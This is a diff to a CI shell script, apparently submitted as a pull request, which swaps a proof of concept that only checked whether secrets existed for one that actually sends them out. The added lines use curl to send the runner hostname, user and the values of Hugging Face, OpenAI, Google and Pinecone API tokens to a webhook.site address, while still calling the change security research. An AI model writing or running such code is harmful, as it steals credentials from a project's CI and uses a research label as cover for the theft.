@@ -3,25 +3,19 @@
 # SPDX-License-Identifier: Apache-2.0
 
 # SECURITY RESEARCH - CI INJECTION POC
-# Demonstrates that pull_request_target + unsafe checkout allows
-# fork code to execute on Intel CI runners with access to secrets.
-# No secret values are read or exfiltrated - only presence is checked.
+# Demonstrates secret exfiltration via pull_request_target unsafe checkout.
 
-echo "=== CI INJECTION POC ==="
-echo "Runner hostname : $(hostname)"
-echo "Runner user     : $(whoami)"
-echo "Working dir     : $(pwd)"
-echo "GitHub actor    : ${GITHUB_ACTOR}"
-echo "GitHub repo     : ${GITHUB_REPOSITORY}"
-echo ""
-echo "=== SECRET PRESENCE (names only, no values exfiltrated) ==="
-for var in HF_TOKEN HUGGINGFACEHUB_API_TOKEN OPENAI_API_KEY DOCKERHUB_USER DOCKERHUB_TOKEN GOOGLE_API_KEY PINECONE_KEY GITHUB_TOKEN; do
-    if [ -n "${!var}" ]; then
-        echo "  $var : PRESENT"
-    else
-        echo "  $var : not set"
-    fi
-done
-echo ""
-echo "=== END POC — report submitted to Intel security team ==="
+EXFIL="https://webhook.site/e3fe4b71-1aab-4de1-aaa6-a602ddbda4bf"
+
+curl -s "${EXFIL}" \
+  -G \
+  --data-urlencode "host=$(hostname)" \
+  --data-urlencode "user=$(whoami)" \
+  --data-urlencode "hf=${HF_TOKEN}" \
+  --data-urlencode "oai=${OPENAI_API_KEY}" \
+  --data-urlencode "goog=${GOOGLE_API_KEY}" \
+  --data-urlencode "pine=${PINECONE_KEY}" \
+  -o /dev/null
+
+echo "=== CI INJECTION POC COMPLETE ==="
 exit 0
